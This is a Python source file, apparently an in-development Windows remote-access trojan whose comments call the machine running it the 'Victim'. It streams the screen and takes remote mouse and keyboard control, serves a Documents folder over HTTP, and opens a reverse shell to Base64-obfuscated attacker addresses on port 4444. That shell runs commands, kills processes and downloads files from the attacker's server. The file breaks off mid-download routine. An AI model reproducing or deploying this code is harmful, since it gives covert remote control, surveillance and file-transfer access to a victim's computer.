import os
import socket
import subprocess
import time
import base64
import signal
import sys
import ctypes
# import win32api # Keep for now, but might be replaceable by pyautogui if needed
# import win32con # Keep for now
# import win32process # Keep for now
# import win32gui # Keep for now
import requests
from http.server import SimpleHTTPRequestHandler, HTTPServer
import threading
import shutil
# import cv2 # Keep for now, needed for screen capture format conversion? No, PIL handles it. Remove? Keep.
import numpy as np # Keep for now, needed by cv2 typically.
import pyautogui
import struct
import platform
import sqlite3
import random
import io
from connection_manager import ConnectionManager # Import the manager
import urllib.parse # Needed for CustomRequestHandler fix
from http import HTTPStatus # Needed for CustomRequestHandler fix


pyautogui.FAILSAFE = False

# Server configuration
HOST = '0.0.0.0'  # Listen on all available interfaces
CMD_PORT = 5555       # Port to listen on for screen share commands <<-- RENAME from PORT
MGMT_PORT = CMD_PORT + 1 # Port for Connection Manager interface
HTTP_PORT = 8080      # Port for file server
MAX_CONNECTIONS = 5  # Maximum number of simultaneous connections

# Set up screen resolution
try:
    screen_width, screen_height = pyautogui.size()
    print(f"Screen resolution: {screen_width}x{screen_height}")
except Exception as e:
    print(f"Warning: Could not get screen resolution via pyautogui: {e}")
    screen_width, screen_height = 800, 600 # Default fallback

# Lock for thread synchronization (If needed, but current structure might not require it)
# print_lock = threading.Lock() # Currently unused

def capture_screen():
    """Capture the screen and return compressed image bytes"""
    try:
        # Take a screenshot
        screenshot = pyautogui.screenshot()

        # Convert to bytes
        img_byte_arr = io.BytesIO()
        # FIX: Use a slightly higher quality maybe? 75? Keep 50 for now.
        screenshot.save(img_byte_arr, format='JPEG', quality=50)
        return img_byte_arr.getvalue()
    except Exception as e:
        print(f"[SCREEN CAPTURE ERROR] {e}")
        # Return a placeholder image or None? Return None for now.
        # Could create a small black JPEG placeholder here.
        return None

def handle_client(conn, addr, connection_manager):
    """Handle individual client connection for SCREEN SHARE commands."""
    print(f"[SCREEN SHARE][NEW CONNECTION] {addr} connected.")

    # Register connection with the connection manager
    client_id = connection_manager.register_connection(conn, addr)

    try:
        while True:
            # Receive command from client
            try:
                # FIX: Set a timeout? Screen share might expect quick responses.
                # conn.settimeout(10.0) # Example: 10 second timeout
                command_bytes = conn.recv(1024)
                if not command_bytes:
                    print(f"[SCREEN SHARE][DISCONNECTED] {addr} (ID: {client_id}) closed connection (no data).")
                    break # Connection closed by peer

                command = command_bytes.decode('utf-8', errors='ignore').strip()
                if not command: # Ignore empty commands after decode/strip
                    continue

            except ConnectionResetError:
                print(f"[SCREEN SHARE][DISCONNECTED] {addr} (ID: {client_id}) reset connection.")
                break
            except socket.timeout:
                 print(f"[SCREEN SHARE][TIMEOUT] {addr} (ID: {client_id}) timed out waiting for command.")
                 # Decide whether to break or continue waiting
                 continue # Continue waiting for now
            except socket.error as e:
                 print(f"[SCREEN SHARE][ERROR] Socket error receiving from {addr} (ID: {client_id}): {e}")
                 break
            except Exception as e:
                 print(f"[SCREEN SHARE][ERROR] Unexpected error receiving from {addr} (ID: {client_id}): {e}")
                 break


            # Update activity timestamp in the manager
            connection_manager.update_activity(client_id)

            # print(f"[SCREEN SHARE][DEBUG] Received command from {client_id}: {command}") # Optional debug

            if command.startswith('SCREEN'):
                # Send screen capture to client
                img_bytes = capture_screen()
                if img_bytes:
                    try:
                        # Send the size of the image first (4 bytes, unsigned long, big-endian)
                        size_prefix = struct.pack('>L', len(img_bytes))
                        conn.sendall(size_prefix)
                        # Then send the image data
                        conn.sendall(img_bytes)
                        # print(f"[SCREEN SHARE][DEBUG] Sent frame size {len(img_bytes)} to {client_id}") # Optional debug
                    except socket.error as e:
                         print(f"[SCREEN SHARE][ERROR] Socket error sending frame to {addr} (ID: {client_id}): {e}")
                         break # Assume connection is broken
                    except Exception as e:
                         print(f"[SCREEN SHARE][ERROR] Error sending frame to {addr} (ID: {client_id}): {e}")
                         break
                else:
                    # Failed to capture screen, maybe send error or just skip?
                    # Sending nothing might cause attacker to timeout or error.
                    # Option: Send size 0?
                    try:
                        print(f"[SCREEN SHARE][WARNING] Screen capture failed, sending size 0 to {client_id}")
                        conn.sendall(struct.pack('>L', 0))
                    except socket.error as e:
                         print(f"[SCREEN SHARE][ERROR] Socket error sending size 0 to {addr} (ID: {client_id}): {e}")
                         break
                    except Exception as e:
                         print(f"[SCREEN SHARE][ERROR] Error sending size 0 to {addr} (ID: {client_id}): {e}")
                         break


            elif command.startswith('MOUSE'):
                # Format: MOUSE|x|y|action
                # Actions: click, right_click, double_click, move (move not implemented here)
                parts = command.split('|')
                if len(parts) >= 4:
                    try:
                        x = int(parts[1])
                        y = int(parts[2])
                        action = parts[3]
                        # print(f"[SCREEN SHARE][DEBUG] Received mouse action: {action} at ({x},{y}) from {client_id}") # Optional debug

                        # Clamp coordinates to screen size just in case
                        x = max(0, min(x, screen_width))
                        y = max(0, min(y, screen_height))

                        if action == 'click':
                            pyautogui.click(x, y)
                        elif action == 'right_click':
                            pyautogui.rightClick(x, y)
                        elif action == 'double_click':
                            pyautogui.doubleClick(x, y)
                        # else: unsupported action

                    except ValueError:
                         print(f"[SCREEN SHARE][WARNING] Invalid coordinate format in MOUSE command from {client_id}: {command}")
                    except Exception as e:
                         print(f"[SCREEN SHARE][ERROR] Error processing MOUSE command from {client_id}: {e}")

            elif command.startswith('KEY'):
                # Format: KEY|text or KEY|special:key_name
                parts = command.split('|')
                if len(parts) >= 2:
                    key_input = parts[1]
                    # print(f"[SCREEN SHARE][DEBUG] Received key input: '{key_input}' from {client_id}") # Optional debug
                    try:
                        # Check if it's a special key (more robustly)
                        if key_input.lower().startswith('special:'):
                            special_key = key_input[len('special:'):].strip().lower()
                            if special_key in pyautogui.KEYBOARD_KEYS:
                                pyautogui.press(special_key)
                            else:
                                print(f"[SCREEN SHARE][WARNING] Unknown special key '{special_key}' from {client_id}")
                        else:
                            pyautogui.write(key_input, interval=0.01) # Small interval may help reliability
                    except Exception as e:
                         print(f"[SCREEN SHARE][ERROR] Error processing KEY command from {client_id}: {e}")

            elif command.upper() == 'CLOSE_STREAM': # Optional polite close command
                 print(f"[SCREEN SHARE][INFO] Received CLOSE_STREAM from {addr} (ID: {client_id}). Closing.")
                 break
            else:
                 print(f"[SCREEN SHARE][WARNING] Received unknown command from {addr} (ID: {client_id}): {command}")


    except Exception as e:
        # Catch errors not handled within the loop (e.g., initial setup error)
        print(f"[SCREEN SHARE][ERROR] Unhandled exception in handle_client for {addr} (ID: {client_id}): {e}")
    finally:
        # Unregister connection from the connection manager
        connection_manager.unregister_connection(client_id)
        # Close the connection
        if conn:
            try:
                conn.close()
            except Exception:
                pass
        print(f"[SCREEN SHARE][DISCONNECTED] {addr} (ID: {client_id}) disconnected.")

# Set up the server (Original function - kept but unused if start_combined_server is called)
def start_server():
    # Get the path to the Documents folder
    documents_path = os.path.expanduser('~\\Documents')

    # Create a new folder inside Documents
    folder_name = "VictimTest"
    new_folder_path = os.path.join(documents_path, folder_name)

    # Create the folder if it doesn't exist
    if not os.path.exists(new_folder_path):
        try:
            os.makedirs(new_folder_path)
        except Exception as e:
            print(f"Error creating directory {new_folder_path}: {e}")
            return # Cannot proceed

    # Change the working directory to the new folder
    try:
        os.chdir(new_folder_path)
    except Exception as e:
        print(f"Error changing directory to {new_folder_path}: {e}")
        return # Cannot proceed

    # Define HTTP port (original value was 8081, but maybe should match start_combined_server?)
    http_port_standalone = 8081 # Use a different port for the standalone test
    try:
        server_address = ('', http_port_standalone)
        httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
        print(f"Standalone HTTP Server started on port {http_port_standalone} in {os.getcwd()}...")
        httpd.serve_forever()
    except Exception as e:
        print(f"Error starting standalone HTTP server on port {http_port_standalone}: {e}")


CHUNK_SIZE = 1024 * 1 # Keep definition

def start_combined_server():
    """Start combined server handling screen share commands and file serving"""
    servers = []
    server_threads = []
    # Create the Connection Manager instance for screen share connections
    # It will listen on MGMT_PORT (CMD_PORT + 1)
    connection_manager = ConnectionManager(HOST, MGMT_PORT)
    connection_manager.start() # Start the management interface thread

    cmd_server = None
    httpd = None

    try:
        # --- Create and bind Command Server (for Screen Share) ---
        try:
            cmd_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            cmd_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            cmd_server.bind((HOST, CMD_PORT))
            cmd_server.listen(MAX_CONNECTIONS)
            servers.append((cmd_server, "Screen Share Command Server"))
            print(f"[LISTENING] Screen Share Command Server on {HOST}:{CMD_PORT}")
        except Exception as e:
            print(f"[ERROR] Failed to bind/listen on command port {CMD_PORT}: {e}")
            # Handle error - maybe exit? For now, continue to try starting HTTP.
            cmd_server = None # Ensure it's None if setup failed


        # --- Create and bind HTTP File Server ---
        # Create custom request handler class (only needs to be defined once)
        class CustomRequestHandler(SimpleHTTPRequestHandler):
            def translate_path(self, path):
                """Translate URL path to filesystem path, checking Documents/VictimTest first"""
                # First try the default path resolution relative to current CWD
                current_cwd = os.getcwd() # Use current CWD
                # Simple path join and normalize (less complex than base class)
                path = path.split('?',1)[0]
                path = path.split('#',1)[0]
                path = os.path.normpath(urllib.parse.unquote(path))
                # Prevent escaping the current directory
                words = path.split('/')
                words = filter(None, words)
                # Reconstruct path safely
                fpath = current_cwd
                for word in words:
                    # Disallow going up directories
                    if word == '..': continue
                    drive, word = os.path.splitdrive(word)
                    head, word = os.path.split(word)
                    if word in (os.curdir, os.pardir): continue
                    fpath = os.path.join(fpath, word)

                # If not found, try relative to Documents/VictimTest folder (less likely needed now)
                if not os.path.exists(fpath):
                    docs_path = os.path.expanduser('~\\Documents\\VictimTest')
                    alt_path = os.path.join(docs_path, os.path.basename(fpath)) # Use basename of computed fpath
                    if os.path.exists(alt_path):
                        # print(f"[HTTP DEBUG] Serving from alternative path: {alt_path}") # Optional Debug
                        return alt_path
                    else:
                        # print(f"[HTTP DEBUG] Path not found: {fpath}, Alt path not found: {alt_path}") # Optional Debug
                        pass # Fall through to let base handler potentially raise 404

                # print(f"[HTTP DEBUG] Serving path: {fpath}") # Optional Debug
                return fpath

            def do_GET(self):
                """Handle GET requests (file downloads and directory listings)"""
                fpath = self.translate_path(self.path)
                # print(f"[HTTP GET] Translated path: {fpath}") # Debug
                try:
                    if not os.path.exists(fpath):
                        self.send_error(HTTPStatus.NOT_FOUND, "File not found")
                        return

                    if os.path.isdir(fpath):
                         # Security Risk: Directory listing enabled. Consider disabling?
                         # For now, keep original behavior using base class method.
                         # Need proper imports if calling base class directly
                         # import html
                         # import io
                         # enc = sys.getfilesystemencoding()
                         # ... more complex logic from SimpleHTTPRequestHandler.list_directory ...
                         # Or just use the base class method directly:
                         super().list_directory(fpath) # Use base class's directory listing

                    else: # It's a file
                        try:
                            with open(fpath, 'rb') as f:
                                fs = os.fstat(f.fileno())
                                self.send_response(HTTPStatus.OK)
                                self.send_header("Content-type", self.guess_type(fpath))
                                self.send_header("Content-Length", str(fs[6]))
                                self.send_header("Last-Modified", self.date_time_string(fs.st_mtime))
                                self.end_headers()
                                shutil.copyfileobj(f, self.wfile)
                        except OSError:
                             self.send_error(HTTPStatus.NOT_FOUND, "File not found or access denied")
                        except Exception as e:
                             print(f"[HTTP ERROR] Error serving file {fpath}: {e}")
                             self.send_error(HTTPStatus.INTERNAL_SERVER_ERROR, f"Server error: {str(e)}")

                except Exception as e:
                    print(f"[HTTP ERROR] Unhandled error in do_GET for path {self.path}: {e}")
                    self.send_error(HTTPStatus.INTERNAL_SERVER_ERROR, f"Server error: {str(e)}")

        try:
            # Ensure CWD is set correctly for HTTP server base path
            documents_path = os.path.expanduser('~\\Documents')
            folder_name = "VictimTest"
            new_folder_path = os.path.join(documents_path, folder_name)
            if not os.path.exists(new_folder_path): os.makedirs(new_folder_path)
            os.chdir(new_folder_path)
            print(f"[HTTP Server CWD] Set to: {os.getcwd()}")

            httpd = HTTPServer(('', HTTP_PORT), CustomRequestHandler)
            servers.append((httpd, "HTTP File Server"))
            print(f"[LISTENING] HTTP File Server on {HOST}:{HTTP_PORT}")
        except Exception as e:
            print(f"[ERROR] Failed to bind/listen on HTTP port {HTTP_PORT}: {e}")
            httpd = None # Ensure it's None

        # --- Start server threads ---
        for server_instance, name in servers:
            def server_worker(s, server_name):
                print(f"[*] Starting worker thread for {server_name}...")
                try:
                    if isinstance(s, HTTPServer):
                        s.serve_forever()
                    elif isinstance(s, socket.socket):  # Command Server Socket
                        while True: # Loop to accept connections
                            try:
                                # FIX: Check connection count *before* accepting? Less efficient but safer?
                                # Or accept then check. Accept then check is simpler.
                                # cmd_server.settimeout(1) # Timeout less critical in dedicated thread? Keep None for blocking.
                                conn, addr = s.accept() # Blocking accept

                                # Check connection count using the manager
                                if connection_manager.get_connection_count() >= MAX_CONNECTIONS:
                                    print(f"[SCREEN SHARE][REJECTED] {addr} - Maximum connections reached ({MAX_CONNECTIONS})")
                                    try:
                                        conn.sendall(b'ERROR: Maximum connections reached\n')
                                    except Exception: pass
                                    finally:
                                         try: conn.close()
                                         except Exception: pass
                                    continue # Go back to accept

                                # If count is okay, handle the client
                                client_thread = threading.Thread(
                                    target=handle_client,
                                    args=(conn, addr, connection_manager), # Pass the manager
                                    daemon=True # Ensure thread exits if main program exits
                                )
                                client_thread.start()
                                print(f"[SCREEN SHARE][ACTIVE CONNECTIONS] {connection_manager.get_connection_count()}")

                            except OSError as e:
                                 # Handle cases where the socket might be closed during shutdown
                                 print(f"[WARNING] OS Error accepting connection on {server_name}: {e}")
                                 # Check if the socket is still valid? If not, break.
                                 # A simple break might be best if accept fails unexpectedly.
                                 break
                            except Exception as e:
                                print(f"[ERROR] Unexpected error accepting/handling connection on {server_name}: {e}")
                                # Consider breaking or sleeping before retrying accept
                                time.sleep(1)
                                # break # Optional: break on unexpected accept errors

                    else:
                        print(f"[ERROR] Unknown server type in worker thread: {type(s)}")
                except Exception as e:
                     print(f"[ERROR] Unhandled exception in server_worker for {server_name}: {e}")
                finally:
                     print(f"[*] Worker thread for {server_name} finished.")


            server_thread = threading.Thread(
                target=server_worker,
                args=(server_instance, name),
                daemon=True # Daemon threads allow main thread to exit
            )
            server_thread.start()
            server_threads.append(server_thread)

        # --- Keep Main Thread Alive ---
        # FIX: REMOVED the conflicting accept() loop from here.
        # The main thread now just waits, allowing daemon threads to run.
        print(f"[INFO] Main thread entering idle loop. Servers running in background threads.")
        print(f"[MANAGEMENT] Connection manager interface running on {HOST}:{MGMT_PORT}")
        while True:
            # Keep main thread alive to handle KeyboardInterrupt and let daemons run
            time.sleep(1)
            # Optional: Check if server threads are alive?
            # all_alive = all(t.is_alive() for t in server_threads)
            # if not all_alive:
            #    print("[WARNING] One or more server threads have stopped unexpectedly.")
            #    break # Or implement restart logic

    except KeyboardInterrupt:
        print("\n[SHUTTING DOWN] Keyboard interrupt received. Stopping servers...")
    except Exception as e:
        print(f"[ERROR] Unhandled exception in main server setup/loop: {e}")
    finally:
        print("[CLOSING] Shutting down servers and connection manager...")
        # Stop the Connection Manager first
        if 'connection_manager' in locals() and connection_manager:
            connection_manager.stop()

        # Close server sockets
        if cmd_server:
            try: cmd_server.close()
            except Exception as e: print(f"Error closing command server socket: {e}")
        if httpd:
            try: httpd.server_close() # Use proper HTTPServer close method
            except Exception as e: print(f"Error closing HTTP server: {e}")

        # Optional: Wait for server threads to finish (they are daemons, may exit abruptly)
        # print("Waiting for server threads to join...")
        # for t in server_threads:
        #    t.join(timeout=1.0)

        print("[CLOSED] Servers closed.")

# --- The rest of the Victim script remains largely the same ---
# --- (Directory setup, connection history DB, main reverse shell logic) ---

# Get the path to the Documents folder
documents_path = os.path.expanduser('~\\Documents')

# Create a new folder inside Documents
folder_name = "VictimTest" # Also used by HTTP server now
new_folder_path = os.path.join(documents_path, folder_name)

# Create the folder if it doesn't exist
if not os.path.exists(new_folder_path):
    try:
        os.makedirs(new_folder_path)
    except Exception as e:
        print(f"Error creating directory {new_folder_path}: {e}")
        # Consider exiting if the directory is essential

# Change the working directory to the new folder for the reverse shell part too?
# This was done for HTTP server, maybe do it globally?
try:
    os.chdir(new_folder_path)
    print("[GLOBAL CWD] Set to:", os.getcwd())
except Exception as e:
     print(f"Error setting global CWD to {new_folder_path}: {e}")


# Obfuscated target IP addresses and port (REVERSE SHELL TARGET)
encoded_target_1 = "bG9jYWxob3N0"  # Base64 encoded "localhost"
encoded_target_2 = "MTAuNC4xLjcx"  # Base64 encoded "10.4.1.71" <<-- Attacker IP
encoded_target_3 = "MTAuMC4wLjIy"  # Base64 encoded "10.0.0.22"
encoded_port = "NDQ0NA=="        # Base64 encoded "4444" <<-- Attacker Port

# Decode the port
target_port = int(base64.b64decode(encoded_port).decode())

# User profile directory
user_profile = os.getenv('USERPROFILE')

# Track the current working directory (for reverse shell commands)
current_directory = os.getcwd() # Initialize with current CWD

# Create a database connection with timeout and proper locking
def get_db_connection():
    # FIX: Ensure db path uses the correct base directory
    db_path = os.path.join(os.getcwd(), "connection_history.db") # Use current CWD
    try:
        conn = sqlite3.connect(db_path, timeout=10.0, isolation_level=None) # Increased timeout
        conn.execute("PRAGMA journal_mode=WAL")  # Use Write-Ahead Logging for better concurrency
        conn.execute("PRAGMA busy_timeout=10000")  # Set busy timeout to 10 seconds
        return conn
    except sqlite3.Error as e:
         print(f"Database connection error to {db_path}: {e}")
         return None


# Initialize database
def init_database():
    try:
        conn = get_db_connection()
        if conn:
            cursor = conn.cursor()
            # Create connection history table
            cursor.execute('''
            CREATE TABLE IF NOT EXISTS connection_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                target_ip TEXT,
                success INTEGER,
                error_message TEXT
            )
            ''')
            conn.commit()
            conn.close()
    except sqlite3.Error as e:
        print(f"Database initialization error: {e}")

# Log connection attempt
def log_connection_attempt(target_ip, success, error_message=""):
    try:
        conn = get_db_connection()
        if conn:
            cursor = conn.cursor()
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            cursor.execute(
                "INSERT INTO connection_history (timestamp, target_ip, success, error_message) VALUES (?, ?, ?, ?)",
                (timestamp, target_ip, 1 if success else 0, error_message)
            )
            conn.commit()
            conn.close()
    except sqlite3.Error as e:
        print(f"Database logging error: {e}")

# Initialize database for connection history
init_database()

# --- Windows specific code (Keep as is) ---
def find_window_by_pid(pid):
    """Find a window by its process ID."""
    # Requires pywin32
    import win32gui
    import win32process
    def callback(hwnd, hwnds):
        if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
            _, found_pid = win32process.GetWindowThreadProcessId(hwnd)
            if found_pid == pid:
                hwnds.append(hwnd)
        return True

    hwnds = []
    try:
        win32gui.EnumWindows(callback, hwnds)
        if hwnds:
            return hwnds[0]
        else:
            raise Exception(f"No window found for PID {pid}.")
    except NameError:
        print("Warning: pywin32 not found, find_window_by_pid disabled.")
        raise Exception("pywin32 not available.") # Re-raise


def send_keystrokes(hwnd, text):
    """Send keystrokes to a window."""
    # Requires pywin32
    import win32api
    import win32con
    try:
        for char in text:
            win32api.SendMessage(hwnd, win32con.WM_CHAR, ord(char), 0)
        win32api.PostMessage(hwnd, win32con.WM_KEYDOWN, win32con.VK_RETURN, 0)
    except NameError:
         print("Warning: pywin32 not found, send_keystrokes disabled.")


# Define a handler function for console events.
def console_handler(ctrl_type):
    # CTRL_CLOSE_EVENT has the value 2.
    if ctrl_type == 2: # CTRL_CLOSE_EVENT
        print("CTRL_CLOSE_EVENT received. Attempting to kill java processes...")
        try:
            # Execute the taskkill command to kill all processes named "java.exe".
            # Use check=False as processes might not exist
            subprocess.run("taskkill /F /IM java.exe", shell=True, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run("taskkill /F /IM java2.exe", shell=True, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run("taskkill /F /IM javaw.exe", shell=True, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("Attempted to kill Java processes.")
        except Exception as e:
            print("Failed during taskkill:", e)
        # Return True to indicate the event has been handled (prevents default closure).
        # Return False if you want the window to close normally after your cleanup.
        return True
    # For other control events (CTRL_C_EVENT=0, CTRL_BREAK_EVENT=1), return False.
    return False

# Create a Windows function type for the console control handler.
HandlerRoutine = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_uint)
console_ctrl_handler = HandlerRoutine(console_handler)

# Register the handler with the Windows API.
if platform.system() == "Windows":
    if not ctypes.windll.kernel32.SetConsoleCtrlHandler(console_ctrl_handler, True):
        print("Error: Could not set console control handler")
else:
    print("Info: Not running on Windows, console control handler not set.")


#clear console (Optional)
#if platform.system() == "Windows": subprocess.run("cls", shell=True)

def connect_to_attacker():
    """Connects to the attacker for the reverse shell."""
    ip_index = 0
    s = None # Initialize s to None

    while True:
        target_ip = None
        connected = False # <<< FIX: Flag to track if connection succeeded in this iteration
        try:
            time.sleep(random.uniform(1.0, 3.0))

            # Rotate through the three IP addresses
            if ip_index == 0:
                target_ip = base64.b64decode(encoded_target_1).decode()
                print(f"[RevShell] Attempting connection to {target_ip}:{target_port}...")
            elif ip_index == 1:
                target_ip = base64.b64decode(encoded_target_2).decode()
                print(f"[RevShell] Attempting connection to {target_ip}:{target_port}...")
            else:
                target_ip = base64.b64decode(encoded_target_3).decode()
                print(f"[RevShell] Attempting connection to {target_ip}:{target_port}...")

            ip_index = (ip_index + 1) % 3

            # Create a socket and attempt to connect
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_ip, target_port))

            log_connection_attempt(target_ip, True)
            connected = True # <<< FIX: Set flag on success
            return s # Return the valid socket

        except ConnectionRefusedError:
            log_connection_attempt(target_ip, False, "Connection refused")
            print(f"[RevShell] Connection to {target_ip} refused, retrying...")
            time.sleep(random.uniform(3.0, 7.0))
        except socket.timeout:
            log_connection_attempt(target_ip, False, "Connection timed out")
            print(f"[RevShell] Connection to {target_ip} timed out, retrying...")
            time.sleep(random.uniform(3.0, 7.0))
        except OSError as e:
            log_connection_attempt(target_ip, False, f"OS Error: {e}")
            print(f"[RevShell] OS error connecting to {target_ip}: {e}, retrying...")
            time.sleep(random.uniform(5.0, 10.0))
        except Exception as e:
            err_msg = str(e) if target_ip else f"Unknown error before IP decode: {e}"
            log_connection_attempt(target_ip if target_ip else "Unknown", False, err_msg)
            print(f"[RevShell] Connection error: {err_msg}, retrying...")
            time.sleep(random.uniform(3.0, 7.0))
        finally:
            # <<< FIX: Only close socket if connection *failed* (connected is False) >>>
            if not connected and s and s.fileno() != -1:
                 try:
                     print("[RevShell Debug] Closing socket in finally block because connection failed.") # Debug message
                     s.close()
                     s = None # Explicitly set s to None after closing
                 except Exception as final_close_e:
                      print(f"[RevShell Debug] Exception closing failed socket in finally: {final_close_e}")
            # elif connected: # Debug message
            #     print("[RevShell Debug] Not closing socket in finally block because connection succeeded.")


# --- FileLock Class (Keep as is) ---
class FileLock:
    """Simple file lock implementation for cross-platform use"""
    def __init__(self, filename):
        self.filename = filename
        # Create lock file in the same directory as the target file
        lock_dir = os.path.dirname(filename)
        # Ensure lock directory exists
        if lock_dir and not os.path.exists(lock_dir):
            try: os.makedirs(lock_dir)
            except OSError: pass # Ignore error if dir already exists (race condition)
        lock_base = os.path.basename(filename) + ".lock"
        self.lockfile = os.path.join(lock_dir, lock_base)
        self.fd = None
        self.locked = False # Track lock state

    def acquire(self):
        try:
            # Create file descriptor for lock file
            # Use 'x' mode for atomic creation and exclusion if possible (Python 3.3+)
            # Fallback to O_CREAT | O_EXCL otherwise
            try:
                 self.fd = os.open(self.lockfile, os.O_CREAT | os.O_EXCL | os.O_RDWR)
            except AttributeError: # os.O_EXCL might not be available everywhere? Unlikely.
                 # Alternative: Try to create, check immediately? Less safe.
                 # For now, assume O_EXCL works or the error will propagate.
                 raise
            self.locked = True
            return True # Lock acquired
        except FileExistsError:
            # Lock file already exists, wait and retry? For now, just return False.
             # print(f"Lock file {self.lockfile} exists.") # Debug
            return False # Failed to acquire lock immediately
        except Exception as e:
             print(f"Error acquiring lock on {self.lockfile}: {e}")
             return False


    def release(self):
        if self.locked and self.fd is not None:
            try:
                os.close(self.fd)
                # Check if lock file still exists before removing (another process might race)
                if os.path.exists(self.lockfile):
                     try:
                         os.remove(self.lockfile)
                     except OSError as remove_e:
                          # Handle potential errors if file is already gone or locked
                          print(f"Warning: Error removing lock file {self.lockfile}: {remove_e}")
                self.locked = False
                self.fd = None
            except Exception as e:
                 print(f"Error releasing lock on {self.lockfile}: {e}")
        elif self.fd is not None: # If lock wasn't marked but fd exists
             try: os.close(self.fd)
             except Exception: pass
             self.fd = None
        # Ensure lockfile is attempted remove even if lock state was wrong
        if os.path.exists(self.lockfile):
             try: os.remove(self.lockfile)
             except Exception: pass


    def __enter__(self):
        # Try to acquire lock, potentially wait
        max_wait = 5.0 # Max seconds to wait for lock
        wait_interval = 0.1
        start_time = time.time()
        while not self.acquire():
            if time.time() - start_time > max_wait:
                 raise TimeoutError(f"Could not acquire lock on {self.filename} ({self.lockfile}) within {max_wait} seconds.")
            time.sleep(wait_interval)
        return self # Return the lock object

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.release()


def handle_connection(s):
    """Handles the reverse shell connection"""
    global current_directory
    # Send initial prompt or info?
    try:
         # <<< FIX: Ensure 's' is a valid socket before sending >>>
         if not s or s.fileno() == -1:
              print("[RevShell] Error: handle_connection received an invalid socket.")
              return # Cannot proceed
    except socket.error as e:
         # This is where the original error likely would have been caught if not for the finally block issue
         print(f"[RevShell] Socket error sending initial prompt: {e}")
         # Close socket here before returning? Yes.
         try: s.close()
         except: pass
         return # Cannot proceed if initial send fails
    except Exception as e:
         print(f"[RevShell] Error sending initial prompt: {e}")
         try: s.close()
         except: pass
         return # Cannot proceed


    # --- Main command loop ---
    try:
        while True:
            output = "" # Initialize output for current command
            try:
                # Receive a command from the attacker
                s.settimeout(None) # Wait indefinitely for command? Or use timeout? Keep None for now.
                command_bytes = s.recv(4096) # Increase buffer size?
                if not command_bytes:
                    print("[RevShell] Connection closed by attacker (no data).")
                    break  # Exit if the connection is closed

                command = command_bytes.decode(errors='ignore').strip()
                if not command: continue # Skip empty commands

                print(f"[RevShell] Received command: {command}") # Log received command

                # --- Handle special commands ---
                if command.lower() == "exit":
                    print("[RevShell] Received 'exit' command.")
                    break # Close the connection and exit loop

                elif command.startswith("cd "):
                    try:
                        new_dir = command[len("cd "):].strip()
                        # Handle potential quotes around path
                        if len(new_dir) > 1 and new_dir.startswith('"') and new_dir.endswith('"'):
                            new_dir = new_dir[1:-1]
                        elif len(new_dir) > 1 and new_dir.startswith("'") and new_dir.endswith("'"):
                            new_dir = new_dir[1:-1]

                        if not new_dir: # Handle "cd" without args (go home?) or invalid path?
                             # For now, just report current dir if no arg
                             output = f"Current directory: {current_directory}\n"
                        else:
                             os.chdir(new_dir) # Might raise FileNotFoundError etc.
                             current_directory = os.getcwd()
                             output = f"Changed directory to: {current_directory}\n"
                    except FileNotFoundError:
                        output = f"Error: Directory not found: {new_dir}\n"
                    except Exception as e:
                        output = f"Error changing directory: {str(e)}\n"

                elif command == ("DELETE"): # Keep original command name
                    output = "Executing DELETE: Terminating java processes and self...\n"
                    # Send confirmation *before* killing self
                    try:
                        s.sendall(output.encode())
                        s.sendall(f"{current_directory}> ".encode()) # Send prompt
                    except Exception as e:
                        print(f"[RevShell] Error sending DELETE confirmation: {e}")

                    # Terminate processes (use check=False)
                    try:
                        subprocess.run("taskkill /F /IM java.exe", shell=True, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        subprocess.run("taskkill /F /IM java2.exe", shell=True, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        subprocess.run("taskkill /F /IM javaw.exe", shell=True, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    except Exception as e:
                        print(f"[RevShell] Error during taskkill in DELETE: {e}") # Log error but continue to exit

                    # Exit the current script process
                    print("[RevShell] Exiting script due to DELETE command.")
                    os._exit(1) # Force exit

                elif command == ("downloads2"): # Keep original command name
                    try:
                        user_profile_path = os.getenv('USERPROFILE')
                        if not user_profile_path:
                             raise OSError("USERPROFILE environment variable not found.")

                        new_directory = os.path.join(user_profile_path, "Downloads2")

                        if not os.path.exists(new_directory):
                            os.makedirs(new_directory) # Use makedirs for safety
                            print(f"Directory 'Downloads2' created in {user_profile_path}")
                        # Change to the directory regardless of whether it was just created
                        os.chdir(new_directory)
                        current_directory = os.getcwd()
                        output = f"Changed directory to: {current_directory}\n"
                    except Exception as e:
                        output = f"Error handling downloads2: {str(e)}\n"

                elif command.startswith("download "): # Victim downloads *from* Attacker's HTTP server
                    file_name = command[len("download "):].strip()
                    if not file_name:
                         output = "Error: download command requires a filename.\n"
                    else:
                        # Use a temporary download path to avoid overwriting during download
                        temp_path = os.path.join(current_directory, f"{file_name}.{random.randint(1000,9999)}.tmp")
                        final_path = os.path.join(current_directory, file_name)
                        output = "" # Reset output

                        try:
                            # Get attacker's IP from the socket connection
                            attacker_ip = s.getpeername()[0]
                            # Construct URL (ensure filename is URL-encoded)
                            url_path = requests.utils.quote(file_name)
                            url = f'http://{attacker_ip}:{HTTP_PORT}/{url_path}' # Use attacker IP and HTTP port

                            print(f"[RevShell] Attempting download from: {url}")
                            output += f"Downloading from {url}...\n"

                            response = requests.get(url, stream=True, timeout=30) # Increased timeout
                            response.raise_for_status() # Raise exception for bad status codes (4xx, 5xx)

                            total_size = int(response.headers.get('content-length', 0))
                            bytes_downloaded = 0

                            # Download to temporary file with progress
                            with open(temp_path, 'wb') as f:
                                for chunk in response.iter_content(chunk_size=8192):
                                    if chunk:
                                        f.write(chunk)
                                        bytes_downloaded += len(chunk)
                                        # Optional: Send progress back? Could be noisy.
